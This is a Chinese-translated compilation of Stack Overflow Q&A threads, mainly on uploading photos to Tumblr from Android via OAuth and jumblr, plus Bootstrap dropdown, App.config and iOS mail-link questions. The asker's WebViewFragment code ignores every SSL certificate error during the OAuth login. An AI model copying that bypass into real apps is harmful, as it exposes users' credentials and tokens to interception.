有人认为使用[Tumblr API](http://www.tumblr.com/docs/en/api/v2)上传图片很容易。它不是。（**编辑**现在，请参阅本条目末尾的*编辑 2 ）*

我的应用程序应该将图像上传到`tumblr`. 我更喜欢从服务中做到这一点，但现在我使用一个在上传完成后立即关闭的活动。在`OnCreate()`用户通过身份验证时：

```
consumer = new CommonsHttpOAuthConsumer(CONSUMER_KEY, CONSUMER_SECRET);

// It uses this signature by default
// consumer.setMessageSigner(new HmacSha1MessageSigner());

provider = new CommonsHttpOAuthProvider(REQUEST_TOKEN_URL,ACCESS_TOKEN_URL,AUTH_URL);

String authUrl;
try 
{
authUrl = provider.retrieveRequestToken(consumer, CALLBACK_URL);
Log.d(TAG, "Auth url:" + authUrl);

startActivity(new Intent("android.intent.action.VIEW", Uri.parse(authUrl)));

} 
```

这将打开一个浏览器活动，用户可以在其中添加用户名和密码，然后应用程序返回到活动（这也是我必须使用活动的原因，我不知道如何从服务中执行此操作）

从浏览器返回数据被提取：

```
Uri uri = context.getIntent().getData();
if (uri != null && uri.toString().startsWith(CALLBACK_URL)) 
{  
    Log.d(TAG, "uri!=null");
    String verifier = uri.getQueryParameter("oauth_verifier");  
    Log.d(TAG, "verifier"+verifier);
    try 
    {
        provider.setOAuth10a(true);
        provider.retrieveAccessToken(consumer, verifier);
        Log.d(TAG, "try");
    } 
    catch (Exception e) 
    {
        Log.e(TAG, e.toString());
        e.printStackTrace();
    } 
OAUTH_TOKEN = consumer.getToken();
OAUTH_SECRET = consumer.getTokenSecret(); 
```

我[从这里](https://stackoverflow.com/questions/7841936/android-tumblr-oauth-signpost-401)得到的这两个片段中的大部分都运行良好。

有了这些令牌，我现在可以尝试将数据放到 tumblr 上。当我尝试添加文本时，使用此方法可以正常工作：

```
private void createText()
{
    if(!OAUTH_TOKEN.equals(""))
    {

        HttpContext context = new BasicHttpContext();
        HttpPost request = new HttpPost("http://api.tumblr.com/v2/blog/" + blogname + ".tumblr.com/post");

        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
        nameValuePairs.add(new BasicNameValuePair("type", "text")); 
        nameValuePairs.add(new BasicNameValuePair("body", "this is just a test"));  

        try 
        {
        request.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        } 
        catch (UnsupportedEncodingException e1) 
        {
            Log.e(TAG, e1.toString());
            e1.printStackTrace();
        }

        if (consumer == null)
        {
            consumer = new CommonsHttpOAuthConsumer(OAuthConstants.TUMBR_CONSUMERKEY, OAuthConstants.TUMBR_SECRETKEY);
        }
        if (OAUTH_TOKEN == null || OAUTH_SECRET == null)
        {
            Log.e(TAG, "Not logged in error");
        }
        consumer.setTokenWithSecret(OAUTH_TOKEN, OAUTH_SECRET);

        try 
        {
            consumer.sign(request);
        } 
        catch (OAuthMessageSignerException e) 
        {

        } 
        catch (OAuthExpectationFailedException e) 
        {
        } 
        catch (OAuthCommunicationException e) 
        {
        }
        HttpClient client = new DefaultHttpClient();
        //finally execute this request
        try 
        {
            HttpResponse response = client.execute(request, context);
            HttpEntity responseEntity = response.getEntity(); 
            if (responseEntity != null) 
            { 
                Log.d(TAG, "responseEntety!=null");
                try 
                {
                    Log.d(TAG, EntityUtils.toString(responseEntity));
                } 
                catch (ParseException e) 
                {
                    e.printStackTrace();
                    Log.e(TAG, e.toString());
                } 
                catch (IOException e) 
                {
                    e.printStackTrace();
                    Log.e(TAG, e.toString());
                } // gives me {"meta":{"status":401,"msg":"Not Authorized"},"response":[]} when I try to upload a photo
            }
            else
            {
                Log.d(TAG, "responseEntety==null");
            }
        } 
        catch (ClientProtocolException e) 
        {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } 
        catch (IOException e) 
        {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
    PostToTumblr.this.finish();
} 
```

正如您在此处看到的那样[http://www.tumblr.com/blog/snapnowandroid](http://www.tumblr.com/blog/snapnowandroid)（至少在此时）发布了“这只是一个测试”的文本。

但是，当我尝试发布图像时，它会变得很奇怪。现在我检查了一下，显然这是 tumblr API 的一个众所周知的问题，这里已经过度讨论了[这个](https://groups.google.com/forum/#!topic/tumblr-api/IDI4QFNMAE4/discussion)问题，有些人已经用其他编程语言（例如[这里](http://brainbackup.net/post/post-images-to-tumblr-using-phonegap-and-jsoauth.html)）解决了它，但我无法重复这些成功。

该方法（在下面的全部内容）与上述方法（有效）具有完全相同的结构，nameValuePairs 只是不同

该方法被赋予一个名为 photo 的 Bitmap 变量：

```
 private void uploadToTumblr(Bitmap photo) 
```

这个位图被转换成一个数组：

```
ByteArrayOutputStream stream = new ByteArrayOutputStream();
photo.compress(Bitmap.CompressFormat.PNG, 100, stream);
byte[] bytes = stream.toByteArray(); 
```

nameValuePairs 填写如下：

```
nameValuePairs.add(new BasicNameValuePair(URLEncoder.encode("type", enc), URLEncoder.encode("photo", enc)));
nameValuePairs.add(new BasicNameValuePair(URLEncoder.encode("caption", enc), URLEncoder.encode(text, enc))); 
nameValuePairs.add(new BasicNameValuePair("data", Base64.encodeToString(bytes, Base64.URL_SAFE))); 
```

结果 `{"meta":{"status":400,"msg":"Bad Request"},"response":{"errors":["Error uploading photo."]}}`来自 tumblr api。

我已尝试按照[本文](http://brainbackup.net/post/post-images-to-tumblr-using-phonegap-and-jsoauth.html)所述对图片进行不同的编码，但没有任何更改。

```
//http://www.coderanch.com/t/526487/java/java/Java-Byte-Hex-String
final char[] hexArray = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
char[] hexChars = new char[bytes.length * 3];
int v;
for ( int j = 0; j < bytes.length; j++ ) 
{
    v = bytes[j] & 0xFF;
    hexChars[j * 3] = '%';
    hexChars[j * 3 + 1] = hexArray[v >>> 4];
    hexChars[j * 3 + 2] = hexArray[v & 0x0F];
}
String s = new String(hexChars);                
s = URLEncoder.encode(s, enc);
nameValuePairs.add(new BasicNameValuePair(URLEncoder.encode("data", enc), s)); 
```

这里是整个方法（没有十六进制编码）：

```
private void uploadToTumblr(Bitmap photo)
{
    if(!OAUTH_TOKEN.equals(""))
    {

        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        photo.compress(Bitmap.CompressFormat.PNG, 100, stream);
        byte[] bytes = stream.toByteArray();

        String text ="SNAP";

        HttpContext context = new BasicHttpContext();
        HttpPost request = new HttpPost("http://api.tumblr.com/v2/blog/" + blogname + ".tumblr.com/post");

        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2); 
        String enc = "UTF-8"; 

        try 
        {
            nameValuePairs.add(new BasicNameValuePair(URLEncoder.encode("type", enc), URLEncoder.encode("photo", enc)));
            nameValuePairs.add(new BasicNameValuePair(URLEncoder.encode("caption", enc), URLEncoder.encode(text, enc))); 
            nameValuePairs.add(new BasicNameValuePair("data", Base64.encodeToString(bytes, Base64.URL_SAFE))); 
        } 
        catch (UnsupportedEncodingException e2) 
        {
            Log.e(TAG, e2.toString());
            e2.printStackTrace();
        } 
        try 
        {
            request.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        } 
        catch (UnsupportedEncodingException e1) 
        {
            Log.e(TAG, e1.toString());
            e1.printStackTrace();
        }

        if (consumer == null)
        {
            consumer = new CommonsHttpOAuthConsumer(OAuthConstants.TUMBR_CONSUMERKEY, OAuthConstants.TUMBR_SECRETKEY);
        }
        if (OAUTH_TOKEN == null || OAUTH_SECRET == null)
        {
            //throw new LoginErrorException(LoginErrorException.NOT_LOGGED_IN);
            Log.e(TAG, "Not logged in error");
        }
        consumer.setTokenWithSecret(OAUTH_TOKEN, OAUTH_SECRET);

            try 
            {
                consumer.sign(request);
            } 
            catch (OAuthMessageSignerException e) 
            {

            } 
            catch (OAuthExpectationFailedException e) 
            {

            } 
            catch (OAuthCommunicationException e) 
            {
            }

            HttpClient client = new DefaultHttpClient();

            //finally execute this request
            try 
            {
                HttpResponse response = client.execute(request, context);
                HttpEntity responseEntity = response.getEntity(); 
                if (responseEntity != null) 
                { 
                    Log.d(TAG, "responseEntety!=null");
                    try 
                    {
                        Log.d(TAG, EntityUtils.toString(responseEntity));
                    } 
                    catch (ParseException e) 
                    {
                        e.printStackTrace();
                        Log.e(TAG, e.toString());
                    } 
                    catch (IOException e) 
                    {
                        e.printStackTrace();
                        Log.e(TAG, e.toString());
                    } 
                }
                else
                {
                    Log.d(TAG, "responseEntety==null");
                }
            } 
            catch (ClientProtocolException e) 
            {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } 
            catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

    }

    else
    {
        Log.d(TAG, "upload imposble... Toklen not set");
    }
    PostToTumblr.this.finish();
} 
```

现在，虽然有几件事我不满意（例如，这是使用活动而不是服务完成的），但这里的大问题显然是上传图像的问题。我绝不是第一个遇到这个问题的人，那么有没有人能够在java中完成这个？

**编辑 1**

手头的问题没有取得任何进展，但创建了一个解决方法，对于有同样问题的人来说可能很好。Tumblr 提供[通过邮件发帖](http://www.tumblr.com/docs/de/email_publishing)，您可以编程 android 在后台发送电子邮件，如下[所示](http://www.jondev.net/articles/Sending_Emails_without_User_Intervention_%28no_Intents%29_in_Android)。这非常有效，但您需要要求用户提供他们的邮件帐户数据和要发布的 Tumblr 邮件地址。

**编辑 2**

多年过去了，使用电子邮件不再是简单的方法。有了[jumblr](https://github.com/tumblr/jumblr)，终于有一个很好的 Java API 可以在 android 上运行。OAuth-Authentication 不好玩（从来都不是），但是一旦你通过了这个，它就太棒了。

现在，从技术上讲，如何进行身份验证的问题不属于这里，但这是我的过长问题，所以我将在这里粘贴一些代码，如果您不感兴趣，请跳过它。

这使用了一个名为*jumblr-0.0.10-jar-with-dependencies.jar*

```
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

import com.tumblr.jumblr.JumblrClient;
import com.tumblr.jumblr.request.RequestBuilder;
import com.tumblr.jumblr.types.Blog;
import com.tumblr.jumblr.types.User;

import org.scribe.builder.ServiceBuilder;
import org.scribe.builder.api.TumblrApi;
import org.scribe.model.Token;
import org.scribe.model.Verifier;
import org.scribe.oauth.OAuthService;

import java.io.File;

public class Tumblr
{
private static final String PROTECTED_RESOURCE_URL = "http://api.tumblr.com/v2/user/info";

static OAuthService service;
static Token requestToken=null;

public static void share(final Activity ctx, File file)
{
    Thread tt = new Thread(new Runnable()
    {
        @Override
        public void run()
        {
            JumblrClient client = new JumblrClient(Tumblr_Constants.CONSUMER_KEY, Tumblr_Constants.CONSUMER_SECRET);
            RequestBuilder requestBuilder = client.getRequestBuilder();
            requestBuilder.setConsumer(Tumblr_Constants.CONSUMER_KEY, Tumblr_Constants.CONSUMER_SECRET);
            SharedPreferences settings = ctx.getSharedPreferences("TumblrData", 0);
            String oauthToken=settings.getString("OauthToken", "");
            String oauthTokenSecret=settings.getString("OauthSecret", "");
            if(oauthToken.equals("") || oauthTokenSecret.equals(""))
            {
                authenticate(ctx);
                while(WebViewFragment.verifier.equals(""))
                {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                String v = WebViewFragment.verifier;
                Token accessToken = authenticatefurther(v);
                SharedPreferences.Editor edit = settings.edit();
                edit.putString("OauthToken", accessToken.getToken());
                edit.putString("OauthSecret", accessToken.getSecret());
                edit.commit();
                oauthToken=settings.getString("OauthToken", "");
                oauthTokenSecret=settings.getString("OauthSecret", "");
            }
            if(!oauthToken.equals("") && !oauthTokenSecret.equals(""))
            {
                client.setToken(oauthToken, oauthTokenSecret);

                User user = client.user();
                System.out.println(user.getName());

                for (Blog blog : user.getBlogs()) {
                    Log.d("TUMBLR", blog.getTitle());
                }
            }
        }

    });
    tt.start();

}

private static void authenticate(Context ctx) {
    service = new ServiceBuilder()
            .provider( TumblrApi.class )
            .apiKey(Tumblr_Constants.CONSUMER_KEY)
            .apiSecret(Tumblr_Constants.CONSUMER_SECRET)
            .callback("snapnao://snapnao.de/ok") // OOB forbidden. We need an url and the better is on the tumblr website !
            .build();

    Log.d("TUMBLR", "=== Tumblr's OAuth Workflow ===" );
    System.out.println();

    // Obtain the Request Token
    Log.d("TUMBLR", "Fetching the Request Token...");
    requestToken = service.getRequestToken();
    Log.d("TUMBLR", "Got the Request Token!");
    Log.d("TUMBLR", "");

    Log.d("TUMBLR", "Now go and authorize Scribe here:" );
    Log.d("TUMBLR", service.getAuthorizationUrl( requestToken ) );

    String url = service.getAuthorizationUrl(requestToken);

    Intent i = new Intent(ctx, WebViewFragment.class);
    i.putExtra("url", url);
    ctx.startActivity(i);

}

private static Token authenticatefurther(String v)
{
    Token accessToken = null;
    Log.d("TUMBLR", "And paste the verifier here");
    Log.d("TUMBLR", ">>");

    Verifier verifier = new Verifier( v);
    Log.d("TUMBLR", "");

    // Trade the Request Token and Verfier for the Access Token
    Log.d("TUMBLR", "Trading the Request Token for an Access Token...");
    accessToken = service.getAccessToken( requestToken ,
            verifier );
    Log.d("TUMBLR", "Got the Access Token!");
    Log.d("TUMBLR", "(if your curious it looks like this: " + accessToken + " )");

    Log.d("TUMBLR", "");

    return accessToken;
}

} 
```

WebViewFragement 如下所示：

```
import android.app.Activity;
import android.graphics.Bitmap;
import android.net.http.SslError;
import android.os.Bundle;
import android.util.Log;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class WebViewFragment extends Activity 
{
public static String verifier="";
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.webviewfragment);

    String url = getIntent().getStringExtra("url");
    Log.d("TUMBLR", "webview-> "+url);
    WebView view = (WebView) findViewById(R.id.webView);
    view.setWebViewClient(
            new SSLTolerentWebViewClient()
    );
    view.getSettings().setJavaScriptEnabled(true);
    view.loadUrl(url);
}

// SSL Error Tolerant Web View Client
private class SSLTolerentWebViewClient extends WebViewClient {

    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        handler.proceed(); // Ignore SSL certificate errors
    }

    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        super.onPageStarted(view, url, favicon);
        Log.d("TUMBLR", "+++++"+url);
        if(url.contains("oauth_verifier="))
        {
            String[] x = url.split("oauth_verifier=");
            verifier=x[1].replace("#_=_", "");
            WebViewFragment.this.finish();
        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-16T01:26:17.567

为什么不使用Tumblr的官方 Java 客户端[Jumblr 。](https://github.com/tumblr/jumblr)

问候。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-08-29T10:10:12.733

您可以使用 jumblr - Tumblr java 客户端轻松完成此操作

```
JumblrClient client = new JumblrClient(Constant.CONSUMER_KEY,Constant.CONSUMER_SECRET);

client.setToken(preferences.getString("token",null), preferences.getString("token_secret", null));

PhotoPost pp = client.newPost(client.user().getBlogs().get(0).getName(),PhotoPost.class);

pp.setCaption(caption);
// pp.setLinkUrl(link);
// pp.setSource(mImage); // String URL
pp.setPhoto(new Photo(imgFile));
pp.save(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-12T12:17:12.117

这对我有用...

```
nameValuePairs.add(new BasicNameValuePair(URLEncoder
                .encode("type", "UTF-8"),
                     URLEncoder.encode("photo", "UTF-8")));
Log.e("Tumblr", "Image shareing file path" + filePath);
nameValuePairs.add(new BasicNameValuePair("caption", caption));
nameValuePairs.add(new BasicNameValuePair("source", filePath));` 
```

其中 filePath 是 http url。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-19T10:20:58.937

我已经使用以下方法完成了。你可以试试这个。

//paramString="你想放在标题中的文本"

```
private void postPhotoTumblr(String uploadedImagePhotoUrl, String paramString)
{
  CommonsHttpOAuthConsumer localCommonsHttpOAuthConsumer = getTumblrConsumer();
  String str1 = "logged in username";
  String encodedImage = uploadedImagePhotoUrl;
  DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
  HttpPost localHttpPost = new HttpPost("http://api.tumblr.com/v2/blog/" + str1 + ".tumblr.com/post");
  try
  {

    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new BasicNameValuePair("type", "photo"));
    BasicNameValuePair localBasicNameValuePair = new BasicNameValuePair("caption", paramString);
    localArrayList.add(localBasicNameValuePair);
    localArrayList.add(new BasicNameValuePair("data",encodedImage));
    UrlEncodedFormEntity localUrlEncodedFormEntity = new UrlEncodedFormEntity(localArrayList);
    localHttpPost.setEntity(localUrlEncodedFormEntity);
    localCommonsHttpOAuthConsumer.sign(localHttpPost);
    InputStream localInputStream = localDefaultHttpClient.execute(localHttpPost).getEntity().getContent();
    InputStreamReader localInputStreamReader = new InputStreamReader(localInputStream);
    BufferedReader localBufferedReader = new BufferedReader(localInputStreamReader);
    StringBuilder localStringBuilder = new StringBuilder();
    while (true)
    {
      String str2 = localBufferedReader.readLine();
      if (str2 == null)
      {
        Log.i("DATA post resp", localStringBuilder.toString());
        break;
      }
      localStringBuilder.append(str2);
    }
  }
  catch (ClientProtocolException localClientProtocolException)
  {
    localClientProtocolException.printStackTrace();
  }
  catch (IOException localIOException)
  {
    localIOException.printStackTrace();
  }
  catch (OAuthMessageSignerException localOAuthMessageSignerException)
  {
    localOAuthMessageSignerException.printStackTrace();
  }
  catch (OAuthExpectationFailedException localOAuthExpectationFailedException)
  {
    localOAuthExpectationFailedException.printStackTrace();
  }
  catch (OAuthCommunicationException localOAuthCommunicationException)
  {
    localOAuthCommunicationException.printStackTrace();
  }
} 
```

编辑：首先将图像上传到 Web 服务器，然后获取 Url 并尝试使用上传的 Url 或文件路径发布。它肯定会正常工作...... :)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-20T04:43:24.183

我已经使用多部分公共类 VideoUploader 扩展 AsyncTask {

```
 ProgressDialog progressDialog;

    @Override
    protected void onPreExecute() {
        // TODO Auto-generated method stub
        progressDialog = ProgressDialog.show(RecordingActivity.this, "",
                "Uploading video.. ");
        super.onPreExecute();
    }

    @Override
    protected JSONObject doInBackground(String... params) {
        JSONObject jsonObject = null;
        StringBuilder builder = new StringBuilder();
        try {
            String url = UrlConst.VIDEO_URL;
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(url);

            FileBody filebodyVideo = new FileBody(new File(params[0]));
            StringBody title = new StringBody("uploadedfile: " + params[0]);
            StringBody description = new StringBody(
                    "This is a video of the agent");
            // StringBody code = new StringBody(realtorCodeStr);

            MultipartEntity reqEntity = new MultipartEntity();
            reqEntity.addPart("uploadedfile", filebodyVideo);
            reqEntity.addPart("title", title);
            reqEntity.addPart("description", description);
            // reqEntity.adddPart("code", code);
            httppost.setEntity(reqEntity);

            // DEBUG
            System.out.println("executing request "
                    + httppost.getRequestLine());
            HttpResponse response = httpclient.execute(httppost);
            HttpEntity resEntity = response.getEntity();

            // DEBUG
            StatusLine status = response.getStatusLine();
            int statusCode = status.getStatusCode();
            System.out.println(response.getStatusLine());
            if (resEntity != null) {
                System.out.println(EntityUtils.toString(resEntity));
            } // end if

            if (resEntity != null) {
                resEntity.consumeContent();
            } // end if
            if (statusCode == 200) {
                InputStream content = resEntity.getContent();
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(content));
                String line;
                while ((line = reader.readLine()) != null) {
                    builder.append(line);
                }
                jsonObject = new JSONObject(builder.toString());
                return jsonObject;
            } else {
                Log.e(LoginActivity.class.toString(),
                        "Failed to download file");
            }
            httpclient.getConnectionManager().shutdown();

        } catch (Exception e) {
            // TODO: handle exception
        }
        return null;
    }

    @Override
    protected void onPostExecute(JSONObject result) {
        // TODO Auto-generated method stub
        super.onPostExecute(result);
        progressDialog.dismiss();
        if (result != null) {

            try {

                JSONObject jsonObject = result
                        .getJSONObject(ParsingTagConst.COMMANDRESULT);
                String strSuccess = jsonObject
                        .getString(ParsingTagConst.SUCCESS);
                String responseString = jsonObject
                        .getString(ParsingTagConst.RESPONSE_STRING);
                Toast.makeText(RecordingActivity.this, "" + responseString,
                        Toast.LENGTH_LONG).show();
                if (strSuccess.equals("1")) {
                    // get here your response
                }

            } catch (Exception e) {
                // TODO: handle exception
            }
        }

    }

}

enter code here 
```

# twitter-bootstrap - Bootstrap 中的双退出菜单

> ID：13845211
> 
> 赞同：0
> 
> 时间：2012-12-12T17:23:00.873
> 
> 标签：twitter-bootstrap

下面的代码一次打开两个dropout memu，你能提供解决方案和背后的原因吗？

JSFiddle 链接：http: [//jsfiddle.net/jsTDz/](http://jsfiddle.net/jsTDz/)

相同的代码复制粘贴在这里：

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
    <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/css/bootstrap-combined.min.css" rel="stylesheet"/>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"> </script>
    <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/js/bootstrap.min.js"></script>
  </head>
  <body>
  <div class="btn-group" style="margin:100px;">  
    <a class="btn" href="#">One</span></a>
   <a id="drop1" class="btn dropdown-toggle" data-toggle="dropdown" href="#"><span class="caret"></span></a>  
   <ul class="dropdown-menu" role="menu" aria-labelledby="drop1">
      <li><a tabindex="-1" href="#">Action</a></li>
      <li><a tabindex="-1" href="#">Another action</a></li>
      <li><a tabindex="-1" href="#">Something else here</a></li>
      <li class="dropdown-submenu">
        <a tabindex="-1" href="#">More options</a>
        <ul class="dropdown-menu ">
          <li><a tabindex="-1" href="#">Action</a></li>
          <li><a tabindex="-1" href="#">Another action</a></li>
          <li><a tabindex="-1" href="#">Something else here</a></li>
        </ul>
      </li>
    </ul>    
  <a class="btn" href="#">ClickMe</span></a>
    <a id="drop2" class="btn dropdown-toggle" data-toggle="dropdown" href="#"><span class="caret"></span></a>
    <ul class="dropdown-menu" role="menu" aria-labelledby="drop2">
      <li><a tabindex="-1" href="#">One</a></li>
      <li><a tabindex="-1" href="#">Two</a></li>
      <li><a tabindex="-1" href="#">Three</a></li>
    </ul>  
  </div>
  </body>
</html>​ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:33:56.463

您同时删除两个菜单的原因是因为您将两个 UL 放在一个“btn-group”DIV 中。引导 CSS 和 JS 使用“btn-group”类来定位它下面的 UL。既然有两个，两个都火。

为了解决这个问题，将你的第二个 UL 包装在一个带有“btn-group”类的 DIV 中。这样，两组列表将保持相互独立。

最后，您的代码应如下所示：

```
<div class="btn-group" style="margin:100px;">  
<a class="btn" href="#">One</span></a>
<a id="drop1" class="btn dropdown-toggle" data-toggle="dropdown" href="#"><span class="caret"></span></a>  
<ul class="dropdown-menu" role="menu" aria-labelledby="drop1">
  <li><a tabindex="-1" href="#">Action</a></li>
  <li><a tabindex="-1" href="#">Another action</a></li>
  <li><a tabindex="-1" href="#">Something else here</a></li>
  <li class="dropdown-submenu">
    <a tabindex="-1" href="#">More options</a>
    <ul class="dropdown-menu ">
      <li><a tabindex="-1" href="#">Action</a></li>
      <li><a tabindex="-1" href="#">Another action</a></li>
      <li><a tabindex="-1" href="#">Something else here</a></li>
    </ul>
  </li>
</ul>  
</div>
<div class="btn-group">  
<a class="btn" href="#">ClickMe</span></a>
<a id="drop2" class="btn dropdown-toggle" data-toggle="dropdown" href="#"><span class="caret"></span></a>
<ul class="dropdown-menu" role="menu" aria-labelledby="drop2">
  <li><a tabindex="-1" href="#">One</a></li>
  <li><a tabindex="-1" href="#">Two</a></li>
  <li><a tabindex="-1" href="#">Three</a></li>
</ul>  
</div> 
```

# visual-studio-2010 - 根据构建配置更改 Windows 窗体中的连接字符串？

> ID：13845212
> 
> 赞同：3
> 
> 时间：2012-12-12T17:23:07.227
> 
> 标签：visual-studio-2010, .net-4.0, xdt-transform

与在 ASP.NET 中如何拥有多个 Web.config 类似，是否可以根据构建配置拥有多个 App.config？

我想更改我的连接字符串，所以如果我正在构建配置`test`，连接字符串应该是：

```
"Server=test;Initial Catalog=test..." 
```

如果我正在构建`test2`，则连接字符串将是：

```
"Server=anotherserver; Initial Catalog=test2..." 
```

目前，我正在手动操作，所以我想知道如何实现自动化？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T22:13:59.960

尽管它们不是本机支持的，但您也可以对 Windows 窗体项目 (App.config) 进行 XML 转换，而不仅仅是 Web 应用程序项目。

有一个支持该支持的 VS 插件，虽然我从未尝试过，但对于安装了 VS 的环境，我会推荐它，因为它由至少一名我确信对 MSBuild 有深入了解的 Microsoft 员工编写，因为他已经写了一[本关于这个主题](https://rads.stackoverflow.com/amzn/click/com/0735626286)的书。

[SlowCheetah - XML 转换](http://visualstudiogallery.msdn.microsoft.com/69023d00-a4f9-4a34-a6cd-7e854ba318b5)

我不知道 SlowCheetah 是否为未安装 VS 的 CI 服务器提供支持，因此我还将基于包含自定义目标文件提出另一种解决方案。

[Visual Studio App.config XML 转换](http://exceptionalcode.wordpress.com/2010/06/21/visual-studio-app-config-xml-transformation/)

（无耻的外挂通知，我是上面那个的原作者）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:01:33.090

我们在这里使用了一种似乎效果很好的策略。每个解决方案都有一个 Web.config。我认为这也适用于 app.configs，但从未尝试过。您创建一个类，将其称为例如 ConfigurationManager。在课堂上应该去这个代码：

```
public static class ConfigurationManager
{
    private static NameValueCollection _appSettings = new NameValueCollection();
    private static ConnectionStringSettingsCollection _connSettings = new ConnectionStringSettingsCollection();

    private enum SettingsType {App, Connection};

    public static NameValueCollection AppSettings
    {
        get 
        {
            if (_appSettings.Count == 0)
            {
                LoadEnvironmentSettings(SettingsType.App);
            }
            return _appSettings;

        }

    }

    public static ConnectionStringSettingsCollection ConnectionStrings
    {
        get
        {
            if (_connSettings.Count == 0)
            {
                LoadEnvironmentSettings(SettingsType.Connection);
            }
            return _connSettings;
        }
    }

    private static void LoadEnvironmentSettings(SettingsType settingsType)
    {
        string strEnvironment = string.Empty, strSeparator = ".";
        if (ConfigurationManager.AppSettings.HasKeys())
        {
            strEnvironment = ConfigurationManager.AppSettings["Environment"];

            if (!String.IsNullOrEmpty(strEnvironment))
            {
                strEnvironment += strSeparator;
                switch (settingsType)
                {
                    case SettingsType.App:
                        LoadAppSettings(strEnvironment.ToUpper());
                        break;
                    case SettingsType.Connection:
                        LoadConnectionSettings(strEnvironment.ToUpper());
                        break;
                }
            }
            else //that part should never happen
            {
                throw new Exception("Missing Environment AppSetting");
            }
        }
    }
    private static void LoadAppSettings(string environmentType)
    {
        string appKey = string.Empty;
        foreach (string key in ConfigurationManager.AppSettings.AllKeys)
        {
            if (key.StartsWith(environmentType))
            {
                appKey = key.Replace(environmentType, string.Empty);
                _appSettings.Add(appKey, ConfigurationManager.AppSettings[key]);
            }
        }
    }
    private static void LoadConnectionSettings(string environmentType)
    {
        //ConnectionStringSettings connStrings = new ConnectionStringSettings();
        string connKey = string.Empty;

        foreach (ConnectionStringSettings str in ConfigurationManager.ConnectionStrings)
        {
            if (str.Name.StartsWith(environmentType))
            {
                connKey = str.Name.Replace(environmentType, string.Empty);
                _connSettings.Add(new ConnectionStringSettings(connKey, str.ConnectionString));
            }
        }
    }
} 
```

您需要添加 System、System.Collections.Generic、System.Collections.Specialized、System.Configuration 和 System.Text。确保你的类与你正在处理的项目在同一个命名空间中。然后，在您的配置文件中添加两个（或更多）键，例如，

```
<add name="TEST.MyConnectionString" connectionString="Data Source=TESTServer;Initial Catalog=MyDatabase;user id=MyUser;pwd=Mypwd" />
<add name="TEST2.MyConnectionString" connectionString="Data Source=TEST2Server;Initial Catalog=MyDatabase;user id=MyUser;pwd=Mypwd" /> 
```

最后，在您的 machine.config 中，在 appSettings 中添加以下内容：

```
<add key="Environment" value="TEST"/> 
```

或者

```
<add key="Environment" value="TEST2"/> 
```

取决于你想做什么。我们通常放置 DEV、STAGING 和 PROD 密钥，然后在我们的三个不同的 DEV、STAGING 和 PROD 服务器上拥有不同的 machine.config 文件。希望这可以帮助

# objective-c - 如何从 dataDetectorTypeLink 设置电子邮件主题？

> ID：13845218
> 
> 赞同：0
> 
> 时间：2012-12-12T17:23:40.380
> 
> 标签：objective-c, ios, uitextfield, datadetectortypes

在 a 的文本中`UITextView`，我有一个电子邮件地址，并且`dataDetectorType`设置为`dataDetectorTypeLink`。有没有办法用这种配置设置电子邮件的主题行？我知道如何使用 设置电子邮件的主题行`MFMailComposeController`，但是有没有办法将它与 结合起来`dataDetectorType`？

**编辑：**这是我在我的应用程序委托中对 `openURL:(NSURL *)url 的（重新）定义：

```
-(void)openURL:(NSURL *)url
{
    MFMailComposeViewController *mailer = [[MFMailComposeViewController alloc] init];
    mailer.mailComposeDelegate = self;
    [mailer setSubject:@"feedback on Gay Haiku"];
    [self presentViewController:mailer animated:YES completion:NULL];
} 
```

但是我收到一个错误`No visible @interface for AppDelegate declares the selector`presentViewController:animated:`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:55:31.697

您是否尝试附加`?subject=`到链接？

```
@"mailto:webmaster@site.com?subject=Web Site Extraordinaire" 
```

我只是意识到只有在您切换到`UIWebView`...时才能使用它。这是一个选项吗？

编辑：

另一种方法是子类化`UIApplication`和覆盖`openURL:`。这在[此处](https://stackoverflow.com/questions/2543967/how-to-intercept-click-on-link-in-uitextview)进行了描述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-19T11:25:54.410

由于这似乎是您控制的固定文本，因此您可以在您的电子邮件地址范围内添加一个`NSLinkAttributeName`属性，`NSAttributedString`而不是启用自动链接检测。这将允许您指定在点击链接时希望系统打开的完整 URL。然后您可以使用 Mundi 的建议（在 URL 中包含 subject=）来设置电子邮件的主题。

